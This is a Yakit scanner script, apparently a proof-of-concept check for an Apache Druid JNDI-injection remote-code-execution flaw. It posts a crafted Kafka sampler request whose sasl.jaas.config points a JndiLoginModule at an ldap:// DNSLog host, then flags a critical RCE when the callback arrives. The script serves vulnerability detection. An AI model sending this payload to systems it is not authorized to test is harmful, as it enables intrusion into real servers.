            '# port scan plugin\nyakit.AutoInitYakit()\n\nPacketPost = `POST /druid/indexer/v1/sampler?for=connect HTTP/1.1\nHost: {{params(target)}}\nAccept: */*\nAccept-Encoding: gzip\nContent-Length: 2\nContent-Type: application/json;charset=utf-8\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\n\n{\n"type":"kafka",\n"spec":{\n"type":"kafka",\n"ioConfig":{"type":"kafka","consumerProperties":{\n"bootstrap.servers":"9.9.9.9:9092",\n"security.protocol":"SASL_SSL",\n"sasl.jaas.config":"com.sun.security.auth.module.JndiLoginModule required user.provider.url=\\"ldap://{{params(paylaod)}}\\" useFirstPass=\\"true\\" serviceName=\\"x\\" group.provider.url=\\"xxx\\";"\n},\n"topic":"any"\n},\n"dataSchema":{\n"dataSource":"sample",\n"timestampSpec":{\n"column":"!!!_no_such_column_!!!",\n"missingValue":"1970-01-01T00:00:00Z"\n},\n"dimensionsSpec":{\n},\n"granularitySpec":{\n"rollup":false\n}\n}\n}\n}\n`\n\ntarget = cli.String("target")\nhost, port = str.ParseStringToHostPort(Target)~\nTarget:=host+`:`+string(port)//兼容用户输入http的情况\nfunc Check(){\n    server,token,err = risk.NewDNSLogDomain()\n\n#token 就是二级域名的字符串\nprintln("dns server addr: ",server)\nprintln("dns server check token:", token)\nrsp, req, err := poc.HTTP(PacketPost, poc.params({\n    "target": Target,\n    "paylaod":server,\n}))\ndump(err)\n results, err = risk.CheckDNSLogByToken(token)\n                if err != nil {\n                    yakit_output(sprintf("check dnslog result failed: %s", err))\n                }\n                if len(results) > 0 {\n                    yakit_output({\n                        "message": "发现一个 jndi注入 漏洞",\n                        "url": sprintf("%v", target),\n                        "payload": server,\n                        "token": token,\n                    })\n                    risk.NewRisk(\n                        sprintf("%v", target),\n                        risk.type("rce"), risk.level("critical"),\n                        risk.title(sprintf("ApacheDruid RCE DNSLog: %v", target)),\n                        risk.titleVerbose(sprintf("ApacheDruid 远程命令执行(DNSLog): %v",target)),\n                        risk.details({\n                            "token": token,\n                        }),\n                        risk.token(token),\n                    )\n                                \n                } \n}\nCheck()',
